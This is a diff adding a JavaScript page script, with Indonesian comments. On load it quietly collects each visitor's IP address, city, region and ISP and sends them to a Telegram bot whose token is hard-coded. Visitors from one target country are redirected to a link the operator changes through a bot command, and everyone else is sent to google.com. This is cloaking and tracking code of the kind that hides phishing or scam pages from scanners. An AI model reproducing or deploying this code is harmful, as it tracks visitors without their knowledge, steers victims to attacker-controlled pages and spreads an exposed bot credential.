@@ -1,0 +1,82 @@
+<script language="javascript">
+
+var chatId = "522070580"; // Ganti dengan chat ID penerima notifikasi
+var BotToken = "6363113728:AAEnwSB8cLitoGZ8eVJNlWfUveGBeuV-LIo";
+var Exit = "https://google.com";
+var TargetCountry = "US"; // Ganti dengan kode negara tujuan
+
+// Fungsi untuk mengubah kode negara menjadi emoji negara
+function getCountryFlagEmoji(countryCode) {
+  countryCode = countryCode.toUpperCase();
+  var OFFSET = 127397;
+  var emoji = String.fromCodePoint(...Array.from(countryCode, c => c.charCodeAt() + OFFSET));
+  return emoji;
+}
+
+function sendNotification(message) {
+  var apiUrl = "https://api.telegram.org/bot" + BotToken + "/sendMessage";
+  
+  var data = {
+    chat_id: chatId,
+    text: message
+  };
+  
+  fetch(apiUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  }).catch(error => {
+    console.log('Error sending notification:', error);
+  });
+}
+
+function getIPDetails() {
+  fetch("https://ipapi.co/json").then(response => {
+    if (!response.ok) {
+      throw new Error('Failed to fetch IP details');
+    }
+    return response.json();
+  }).then(data => {
+    var countryEmoji = getCountryFlagEmoji(data.country_code);
+    var ipDetails = "-------New Click-------\nIP: " + data.ip + "\nCountry: " + countryEmoji + "[" + data.country_name + "]\nCity: " + data.city + "\nRegion: " + data.region + "\nISP: " + data.org + "\n-------END-------";
+    
+    if (data.country_code.toUpperCase() === TargetCountry) {
+      sendNotification(ipDetails);
+      Redirect();
+    } else {
+      var notAllowedMessage = "-------Not Allowed-------\nIP: " + data.ip + "\nCountry: " + countryEmoji + "[" + data.country_name + "]\nISP: " + data.org + "\n-------END-------";
+      sendNotification(notAllowedMessage);
+      window.location.replace(Exit);
+    }
+  }).catch(error => {
+    console.log('Error fetching IP details:', error);
+  });
+}
+
+function Redirect() {
+  fetch("https://api.telegram.org/bot" + BotToken + "/getUpdates?limit=1&offset=-1")
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Failed to fetch updates');
+      }
+      return response.json();
+    })
+    .then(data => {
+      var msg = data.result[0].message.text;
+      if (msg.startsWith("/update")) {
+        var newLink = msg.split(" ")[1];
+        window.location.replace(newLink);
+      } else {
+        window.location.replace(Exit);
+      }
+    })
+    .catch(error => {
+      console.log('Error fetching updates:', error);
+    });
+}
+
+getIPDetails();
+
+</script>
